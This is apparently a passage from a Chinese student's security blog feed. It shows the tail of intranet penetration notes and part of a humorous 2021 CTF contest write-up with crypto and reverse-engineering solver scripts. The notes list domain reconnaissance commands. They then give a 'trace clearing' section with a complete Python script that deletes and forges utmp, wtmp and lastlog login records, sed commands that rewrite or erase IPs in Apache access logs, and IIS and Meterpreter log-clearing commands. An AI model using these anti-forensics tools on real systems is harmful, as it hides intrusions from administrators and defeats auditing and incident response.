SSPs权限维持</li><li>GPO组策略权限维持</li></ol><h3 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h3><p>常用cmd命令</p><blockquote><p><code>net view /domain</code> 查看当前存在几个域<br><code>net time /domain</code> 查看域时间及域服务器的名字<br><code>ipconfig /all</code>  可查询DNS服务器<br><code>ping xxx.com</code> 获取域控制器IP，或者<code>nslookup、set type=a、really.com</code><br><code>net group “Domain Controllers” /domain</code> 查看域控主机名称<br><code>net group “domain admins” /domain</code> 查看域管理员</p></blockquote><h2 id="痕迹清除"><a href="#痕迹清除" class="headerlink" title="痕迹清除"></a>痕迹清除</h2><h3 id="Linux日志"><a href="#Linux日志" class="headerlink" title="Linux日志"></a>Linux日志</h3><blockquote><p><code>history</code> 查看命令历史记录<br><code>history -c</code> 清除命令历史记录</p></blockquote><p>设置不记录历史命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">unset</span> HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG</span><br><span class="line"><span class="built_in">export</span> HISTFILE=/dev/null</span><br><span class="line"><span class="built_in">export</span> HISTSIZE=0</span><br><span class="line"><span class="built_in">export</span> HISTFILESIZE=0</span><br></pre></td></tr></table></figure><blockquote><p><code>w</code> 查看utmp日志</p></blockquote><p>利用logtamper工具进行删除</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python logtamper.py –m 1 –u root –i 192.168.122.16</span><br></pre></td></tr></table></figure><blockquote><p><code>w</code> 查看wtmp日志</p></blockquote><p>同上</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python logtamper.py –m 2 –u root –i 192.168.122.16</span><br></pre></td></tr></table></figure><blockquote><p><code>lastlog</code> 查看lastlog日志</p></blockquote><p>将上次登录事件修改为2018年9月24日10:11:12</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python logtamper.py –m 3 –u root –i 192.168.122.16 –t tty1 –d 2018:09:24:10:11:12</span><br></pre></td></tr></table></figure><p>logtamper.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> os, struct, sys</span><br><span class="line"><span class="keyword">from</span> pwd <span class="keyword">import</span> getpwnam</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> strptime, mktime</span><br><span class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</span><br><span class="line">  </span><br><span class="line">UTMPFILE = <span class="string">&quot;/var/run/utmp&quot;</span></span><br><span class="line">WTMPFILE = <span class="string">&quot;/var/log/wtmp&quot;</span></span><br><span class="line">LASTLOGFILE = <span class="string">&quot;/var/log/lastlog&quot;</span></span><br><span class="line">  </span><br><span class="line">LAST_STRUCT = <span class="string">&#x27;I32s256s&#x27;</span></span><br><span class="line">LAST_STRUCT_SIZE = struct.calcsize(LAST_STRUCT)</span><br><span class="line">  </span><br><span class="line">XTMP_STRUCT = <span class="string">&#x27;hi32s4s32s256shhiii4i20x&#x27;</span></span><br><span class="line">XTMP_STRUCT_SIZE = struct.calcsize(XTMP_STRUCT)</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getXtmp</span>(<span class="params">filename, username, hostname</span>):</span><br><span class="line">    xtmp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        fp = <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="built_in">bytes</span> = fp.read(XTMP_STRUCT_SIZE)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">bytes</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">  </span><br><span class="line">            data = struct.unpack(XTMP_STRUCT, <span class="built_in">bytes</span>)</span><br><span class="line">            record = [(<span class="keyword">lambda</span> s: <span class="built_in">str</span>(s).split(<span class="string">&quot;\0&quot;</span>, <span class="number">1</span>)[<span class="number">0</span>])(i) <span class="keyword">for</span> i <span class="keyword">in</span> data]</span><br><span class="line">            <span class="keyword">if</span> (record[<span class="number">4</span>] == username <span class="keyword">and</span> record[<span class="number">5</span>] == hostname):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            xtmp += <span class="built_in">bytes</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        showMessage(<span class="string">&#x27;Cannot open file: %s&#x27;</span> % filename)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        fp.close()</span><br><span class="line">    <span class="keyword">return</span> xtmp</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modifyLast</span>(<span class="params">filename, username, hostname, ttyname, strtime</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = getpwnam(username)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        showMessage(<span class="string">&#x27;No such user.&#x27;</span>)</span><br><span class="line">  </span><br><span class="line">    timestamp = <span class="number">0</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        str2time = strptime(strtime, <span class="string">&#x27;%Y:%m:%d:%H:%M:%S&#x27;</span>)</span><br><span class="line">        timestamp = <span class="built_in">int</span>(mktime(str2time))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        showMessage(<span class="string">&#x27;Time format err.&#x27;</span>)</span><br><span class="line">  </span><br><span class="line">    data = struct.pack(LAST_STRUCT, timestamp, ttyname, hostname)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        fp = <span class="built_in">open</span>(filename, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">        fp.seek(LAST_STRUCT_SIZE * p.pw_uid)</span><br><span class="line">        fp.write(data)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        showMessage(<span class="string">&#x27;Cannot open file: %s&#x27;</span> % filename)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        fp.close()</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">showMessage</span>(<span class="params">msg</span>):</span><br><span class="line">    <span class="built_in">print</span> msg</span><br><span class="line">    exit(-<span class="number">1</span>)</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">saveFile</span>(<span class="params">filename, contents</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        fp = <span class="built_in">open</span>(filename, <span class="string">&#x27;w+b&#x27;</span>)</span><br><span class="line">        fp.write(contents)</span><br><span class="line">    <span class="keyword">except</span> IOError <span class="keyword">as</span> e:</span><br><span class="line">        showMessage(e)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        fp.close()</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    usage = <span class="string">&#x27;usage: logtamper.py -m 2 -u root -i 192.168.0.188\n \</span></span><br><span class="line"><span class="string">        logtamper.py -m 3 -u root -i 192.168.0.188 -t tty1 -d 2015:05:28:10:11:12&#x27;</span></span><br><span class="line">    parser = OptionParser(usage=usage)</span><br><span class="line">    parser.add_option(<span class="string">&#x27;-m&#x27;</span>, <span class="string">&#x27;--mode&#x27;</span>, dest=<span class="string">&#x27;MODE&#x27;</span>, default=<span class="string">&#x27;1&#x27;</span> , <span class="built_in">help</span>=<span class="string">&#x27;1: utmp, 2: wtmp, 3: lastlog [default: 1]&#x27;</span>)</span><br><span class="line">    parser.add_option(<span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;--ttyname&#x27;</span>, dest=<span class="string">&#x27;TTYNAME&#x27;</span>)</span><br><span class="line">    parser.add_option(<span class="string">&#x27;-f&#x27;</span>, <span class="string">&#x27;--filename&#x27;</span>, dest=<span class="string">&#x27;FILENAME&#x27;</span>)</span><br><span class="line">    parser.add_option(<span class="string">&#x27;-u&#x27;</span>, <span class="string">&#x27;--username&#x27;</span>, dest=<span class="string">&#x27;USERNAME&#x27;</span>)</span><br><span class="line">    parser.add_option(<span class="string">&#x27;-i&#x27;</span>, <span class="string">&#x27;--hostname&#x27;</span>, dest=<span class="string">&#x27;HOSTNAME&#x27;</span>)</span><br><span class="line">    parser.add_option(<span class="string">&#x27;-d&#x27;</span>, <span class="string">&#x27;--dateline&#x27;</span>, dest=<span class="string">&#x27;DATELINE&#x27;</span>)</span><br><span class="line">    (options, args) = parser.parse_args()</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(args) &lt; <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> options.MODE == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> options.USERNAME == <span class="literal">None</span> <span class="keyword">or</span> options.HOSTNAME == <span class="literal">None</span>:</span><br><span class="line">                showMessage(<span class="string">&#x27;+[Warning]: Incorrect parameter.\n&#x27;</span>)</span><br><span class="line">  </span><br><span class="line">            <span class="keyword">if</span> options.FILENAME == <span class="literal">None</span>:</span><br><span class="line">                options.FILENAME = UTMPFILE</span><br><span class="line">  </span><br><span class="line">            <span class="comment"># tamper</span></span><br><span class="line">            newData = getXtmp(options.FILENAME, options.USERNAME, options.HOSTNAME)</span><br><span class="line">            saveFile(options.FILENAME, newData)</span><br><span class="line">  </span><br><span class="line">        <span class="keyword">elif</span> options.MODE == <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> options.USERNAME == <span class="literal">None</span> <span class="keyword">or</span> options.HOSTNAME == <span class="literal">None</span>:</span><br><span class="line">                showMessage(<span class="string">&#x27;+[Warning]: Incorrect parameter.\n&#x27;</span>)</span><br><span class="line">  </span><br><span class="line">            <span class="keyword">if</span> options.FILENAME == <span class="literal">None</span>:</span><br><span class="line">                options.FILENAME = WTMPFILE</span><br><span class="line">  </span><br><span class="line">            <span class="comment"># tamper</span></span><br><span class="line">            newData = getXtmp(options.FILENAME, options.USERNAME, options.HOSTNAME)</span><br><span class="line">            saveFile(options.FILENAME, newData)</span><br><span class="line">  </span><br><span class="line">        <span class="keyword">elif</span> options.MODE == <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> options.USERNAME == <span class="literal">None</span> <span class="keyword">or</span> options.HOSTNAME == <span class="literal">None</span> <span class="keyword">or</span> options.TTYNAME == <span class="literal">None</span> <span class="keyword">or</span> options.DATELINE == <span class="literal">None</span>:</span><br><span class="line">                showMessage(<span class="string">&#x27;+[Warning]: Incorrect parameter.\n&#x27;</span>)</span><br><span class="line">  </span><br><span class="line">            <span class="keyword">if</span> options.FILENAME == <span class="literal">None</span>:</span><br><span class="line">                options.FILENAME = LASTLOGFILE</span><br><span class="line">  </span><br><span class="line">            <span class="comment"># tamper</span></span><br><span class="line">            modifyLast(options.FILENAME, options.USERNAME, options.HOSTNAME, options.TTYNAME , options.DATELINE)</span><br><span class="line">  </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            parser.print_help()</span><br></pre></td></tr></table></figure><h3 id="Web日志"><a href="#Web日志" class="headerlink" title="Web日志"></a>Web日志</h3><h4 id="Apache日志"><a href="#Apache日志" class="headerlink" title="Apache日志"></a>Apache日志</h4><blockquote><p><code>find / -name *access*log</code> 搜索全部日志<br><code>sed –i ‘s/192.168.122.18/192.168.122.17/’ /var/log/httpd/access.log</code>  将访问IP为192.168.122.18的地址替换为192.168.122.17<br><code>sed–i‘/192.168.122.17/’d /var/log/httpd/access.log</code> 删除访问IP为192.168.122.17的记录</p></blockquote><h4 id="IIS日志"><a href="#IIS日志" class="headerlink" title="IIS日志"></a>IIS日志</h4><p>CleanIISLog</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CleanIISLog.exe u_ex201008.log 192.168.122.18</span><br></pre></td></tr></table></figure><p>用工具就行了，略</p><h3 id="Windows日志"><a href="#Windows日志" class="headerlink" title="Windows日志"></a>Windows日志</h3><p>利用MSF</p><blockquote><p><code>runevent_manager –i</code> 查看日志及其配置信息<br><code>clearev</code> 清除系统日志</p></blockquote><hr><p>好！学完啦！撒花！（悲</p><h1 id="垃圾卓越班"><a href="#垃圾卓越班" class="headerlink" title="垃圾卓越班"></a>垃圾卓越班</h1><p>如题，垃圾卓越班，狗都不来（</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;内网渗透笔记&quot;&gt;&lt;a href=&quot;#内网渗透笔记&quot; class=&quot;headerlink&quot; title=&quot;内网渗透笔记&quot;&gt;&lt;/a&gt;内网渗透笔记&lt;/h1&gt;&lt;p&gt;大一脑子进水报了卓越班，放暑假了还在这坐大牢，做一天和尚撞一天钟，记个笔记让我这个月有点收获吧（&lt;/p&gt;
&lt;</summary>
      
    
    
    
    <category term="Web" scheme="http://example.com/categories/Web/"/>
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>2021领航杯 &amp; 蚌埠住了</title>
    <link href="http://example.com/2021/10/09/2021%E9%A2%86%E8%88%AA%E6%9D%AF/"/>
    <id>http://example.com/2021/10/09/2021%E9%A2%86%E8%88%AA%E6%9D%AF/</id>
    <published>2021-10-09T15:09:20.000Z</published>
    <updated>2021-10-09T18:45:26.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2021领航杯"><a href="#2021领航杯" class="headerlink" title="2021领航杯"></a>2021领航杯</h1><h2 id="初赛"><a href="#初赛" class="headerlink" title="初赛"></a>初赛</h2><p>比赛时间六小时，平台存活时间5分钟，哥们手里全是flag，全程刷新平台尝试提交，而且整个一江苏省赛，连个比赛群都没有，只有个指导老师通知群</p><p>懂了，这是对自身题目质量的自信和对学校指导老师的信任，贵比赛必定题目质量极高</p><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="ECC"><a href="#ECC" class="headerlink" title="ECC"></a>ECC</h4><p>爆破，可以中间相遇减少点时间<del>（抄别的比赛的题，结果自己改题的时候还有语法错误</del></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = <span class="number">64464091191308356774703439660771627086045800299627641179047457478059588557461</span></span><br><span class="line">a = <span class="number">31926335967105564755113987930261069322507794703287741857397622356704769886356</span></span><br><span class="line">b = <span class="number">34835808070187351680507689900273321615070127680320357724483770400791707112940</span></span><br><span class="line">Gx = <span class="number">2053202552422630348010474635096983783565667661786369125783579647572276572403</span></span><br><span class="line">Gy = <span class="number">51320753844844801021362329076409450910659564359017581255542897537756778371539</span></span><br><span class="line">Zp = Zmod(p)</span><br><span class="line">EC = EllipticCurve(Zp, [a, b])</span><br><span class="line">G = EC(Gx, Gy)</span><br><span class="line">K = EC(<span class="number">31981799071949968743482831587417174146463993877255771340814476669214408840460</span>,<span class="number">15144025062588325012239455117890516531350002058200271280110877844265896081387</span>)</span><br><span class="line"></span><br><span class="line">Da = [<span class="number">4</span>,<span class="number">3</span>,<span class="number">1246057</span>,<span class="number">2357351</span>,<span class="number">435374689</span>]</span><br><span class="line">Db = [<span class="number">1</span>,<span class="number">1</span>,<span class="number">1016839</span>,<span class="number">813641</span>,<span class="number">35993350</span>]</span><br><span class="line">kn = crt(Db,Da)</span><br><span class="line">n = <span class="number">4</span>*<span class="number">3</span>*<span class="number">1246057</span>*<span class="number">2357351</span>*<span class="number">435374689</span></span><br><span class="line"><span class="built_in">set</span> = &#123;(n*i*<span class="number">1500</span>+kn)*G:i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1500</span>)&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1500</span>):</span><br><span class="line">    C = n*i*G+K</span><br><span class="line">    <span class="keyword">if</span>(C <span class="keyword">in</span> <span class="built_in">set</span>):</span><br><span class="line">        k = <span class="number">1500</span>*<span class="built_in">set</span>[C]*n+kn-n*i</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(k))</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="BMC"><a href="#BMC" class="headerlink" title="BMC"></a>BMC</h4><p>有工具，一把梭<del>（github下载之后，点开即送flag</del></p><p><a href="https://github.com/0xTowel/BMC-Viewer-Backup">https://github.com/0xTowel/BMC-Viewer-Backup</a></p><h3 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h3><h4 id="GetFlag"><a href="#GetFlag" class="headerlink" title="GetFlag"></a>GetFlag</h4><p><del>哥们不懂二进制，只是听说很tm水</del></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">key  = <span class="built_in">list</span>(<span class="string">&quot;123456789getflag&quot;</span>)</span><br><span class="line">c1 = <span class="string">&#x27;abcdefgh13462579&#x27;</span></span><br><span class="line">c2 = <span class="string">&quot;ccccebeebbeafbeeeabefabfaffffafaafaaea4b292he31922g6d54a62hchf2bb9ehagdc&quot;</span></span><br><span class="line">output = <span class="string">&#x27;&#x27;</span></span><br><span class="line">tmp1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c2:</span><br><span class="line">    output += <span class="built_in">hex</span>(c1.find(i))[<span class="number">2</span>:]</span><br><span class="line">listput = <span class="built_in">list</span>(output)</span><br><span class="line">tmp1 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">36</span>):</span><br><span class="line">    tmp1.append(((<span class="built_in">int</span>(listput[i],<span class="number">16</span>) &lt;&lt; <span class="number">4</span>) | (<span class="built_in">int</span>(listput[i + <span class="number">36</span>],<span class="number">16</span>) &amp; <span class="number">0xf</span>)))</span><br><span class="line">v0 = <span class="built_in">list</span>(<span class="string">&#x27;a&#x27;</span> * <span class="number">36</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">36</span>):</span><br><span class="line">    v0[<span class="number">35</span>-i] = tmp1[i] ^ <span class="built_in">ord</span>(key[i % <span class="number">16</span>])</span><br><span class="line">inside = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">36</span>):</span><br><span class="line">    inside.append(v0[i] ^ i)</span><br><span class="line">flag =<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> inside:</span><br><span class="line">    flag += <span class="built_in">chr</span>(i)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>略</p><h3 id="一些不是重要但是又很有趣的东西"><a href="#一些不是重要但是又很有趣的东西" class="headerlink" title="一些不是重要但是又很有趣的东西"></a>一些不是重要但是又很有趣的东西</h3><blockquote><p>比赛公告：本次比赛采用动态flag反作弊监控技术，经组委会发现比赛作弊或对比赛平台产生攻击行为，将采取禁赛、直接取消成绩等处罚措施，希望各位选手严格遵守竞赛规则……</p><p>现实：比赛刚开始平台就给人日烂了，变成了群文件做题，三题定天下（</p></blockquote><p>一句话总结就是：CTF解题大赛（×exp搜索大赛（√flag提交大赛（√</p><h2 id="决赛"><a href="#决赛" class="headerlink" title="决赛"></a>决赛</h2><p>看了眼决赛居然是awd模式，我还在寻思这主办方还能办awd？而且是听说没有pwn的awd，抱着看热闹的态度还是选择去线下看看<del>（主要是综测得时候能加点分）</del></p><p>为了给大家带来身临其境的感受，我决定跟大家分享我的生活，时代都进步了，给大伙整点AR体验</p><h3 id="赛前"><a href="#赛前" class="headerlink" title="赛前"></a>赛前</h3><p>先让大家和我一起登录我的微信</p><blockquote><p>很久很久以前</p><p>xxxxx比赛将于xxxx举办xxxxxx……</p><p>[比赛座次示意图]<img src="https://s3.bmp.ovh/imgs/2021/10/34f092d6650b37bc.jpg"></p></blockquote><p>先不说画质有多离谱，反正这图我是看不懂的，一个队三个人你整四个座</p><p>懂了，第四个是给指导老师休息的是吧，彳亍，这么人性化的安排，我直接好评</p><blockquote><p>10.8下午2:16</p><p>我：老师 明天我们线下赛是可以连接外网吗？</p><p>我：另外线下采用的是awd还是awdp模式呢（就是给不给流量</p></blockquote><p><del>（石沉大海）</del> 行吧，不理我就不理吧（</p><blockquote><p>10.8下午2:22</p><p>老师：明天请各位同学11:30在西区主楼前集合，一起乘车前往，请相互告知@xxxx（我们队唯一的女生）</p><p>老师：@xx（我）@（另一个男生）</p><p>我：收到</p><p>（过了十几分钟）</p><p>老师：组委会表示不允许连接外网</p></blockquote><p>好家伙？居然理我了？那这必须得抓住时机多问点</p><blockquote><p>我：那比赛模式呢</p><p>我：比赛会给流量吗</p><p>（又过了十几分钟）</p><p>老师：[截图]（很久之前发过的红头文件）</p></blockquote><p>哥们是没有你这红头文件是吧，确定一下主办方有没有流量都这么难是吧</p><blockquote><p>我们队唯一的女生：西区主楼在哪0.0</p><p>（秒回）</p><p>老师：就是一号楼</p><p>老师：最高的[表情]</p><p>我：意思是没有流量是嘛</p><p>我：那还有个问题是</p><p>我：这次的线下平台承办方是谁呀</p></blockquote><p><del>（石沉大海2.0）</del>？啥意思啊？当我不存在是吧？<del>怎么进的线下没点B数吗？</del></p><p>10.9 前往赛场</p><p>做老师的车过来，<del>路上玩手机给我玩晕车了（</del>，半路上看了眼比赛场地，只看见场地在好高级的酒店里头，附近还有好多的小吃店</p><blockquote><p>鬼鬼，这么有钱能租到这么豪华的场地，平台辣鸡不辣鸡无所谓，哥们能有茶歇吃就行了，要是平台烂了更好，哥们直接住在茶歇，变成茶歇区第一老带哥（逃</p></blockquote><p>好奇心驱使着我偷偷溜进去看了一眼场地，在门口左看右看，看了半天没瞅见摆吃的的地方</p><blockquote><p>完蛋，awd没茶歇，快乐少一半</p></blockquote><p>等了半天等到指导老师买了点吃的和咖啡回来，门口吃完了之后就进比赛场地了</p><p>初入大厅，迎面有个巨大无比的带屏幕，在看看隔离带旁边有群不合群的四五个小伙子，看看胸前的牌子，原来是由五人组成的专业运维组，不过我没想多少，便打算去找自己的位置看看平台长啥样</p><p>哥们进去想着哥们初赛是第一，座位应该是离带屏幕最近的哪个角上坐着，于是直接奔着离大屏幕最近的角大步前进，走过去一看，居然的学校，哥们于是自信回头，想着哥们应该是另外一个角，背着包就往那冲，再定睛一看，上面清清楚楚写着几个大字<code>xxxxxx有限公司</code>，奇了怪了，于是我开始环顾四周，大厅找了个遍，终于在离屏幕最远的小角落里找到了<code>南京航空航天大学</code>字样，于是便赶紧招呼着几个队友坐下了</p><blockquote><p>？啥意思？？哥们初赛第一做最远的小角落？</p></blockquote><p>再仔细想了想，好像我离运维近一点，有啥问题应该属于是头一个解决的，属于是主办方对哥们的特别优待，那也彳亍，于是便找了小角落的桌子的最角落的座位坐下了</p><p>过了一会过来一小姐姐，直接和哥们开始对话</p><blockquote><ul><li>“你好，我们这个位置不能做人的”</li><li>“为啥，你们这一共四个座为啥不能坐”</li><li>“我们桌子上放这个牌子这里是不能坐人的”</li><li>“彳亍，那我这就走”</li></ul></blockquote><p><del>哥们是座山是吧？坐在那就能给你那么大的牌子挡住了？</del></p><p>想了想说的也是，这么大的比赛，还请了这么重要的领导，总得把面子工程做到位，一定支持主办方的安排，是我情商太低了，即刻深度反思</p><p>座位调整完了之后，调了调地址啥的就能连上平台了</p><p><img 